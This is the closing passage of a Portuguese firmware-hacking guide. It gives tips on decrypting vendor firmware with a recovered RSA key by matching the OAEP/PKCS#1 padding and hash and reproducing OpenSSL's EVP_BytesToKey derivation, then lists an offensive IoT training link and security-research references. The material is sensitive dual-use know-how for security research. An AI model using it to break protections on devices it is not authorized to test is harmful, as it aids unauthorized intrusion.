- Teste a chave RSA recuperada usando o par exato de padding/hash usado pelo KMS. Uma falha na descriptografia PKCS#1 v1.5 e uma falha na descriptografia OAEP padrão **não** provam que a chave está errada; muitos fluxos baseados no Vault usam OAEP com SHA-256, enquanto bibliotecas comuns usam SHA-1 por padrão.
- Se o payload começar com `Salted__`, reproduza exatamente o KDF do OpenSSL do fornecedor (`EVP_BytesToKey`, geralmente MD5 em dispositivos legados) antes de tentar a descriptografia AES-CBC.

Isso transforma o "firmware criptografado" em um problema mais geral: **recuperar as chaves operacionais do lado do appliance e, em seguida, reproduzir offline os parâmetros exatos de unwrap + KDF**.

## Treinamento e Certificações

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Quebrando o firmware com Claude: habilidade de nível sênior, autonomia de nível júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia de teste de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking prático de IoT: o guia definitivo para atacar a Internet das Coisas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explorando zero-days em hardware abandonado – blog da Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Como um dispositivo inteligente de US$ 20 me deu acesso à sua casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Agora você vê mi: agora você foi Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explorando o Tesla Wall Connector pela porta de conexão de carregamento - Parte 2: contornando o anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faça piscar: exploração over-the-air da Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
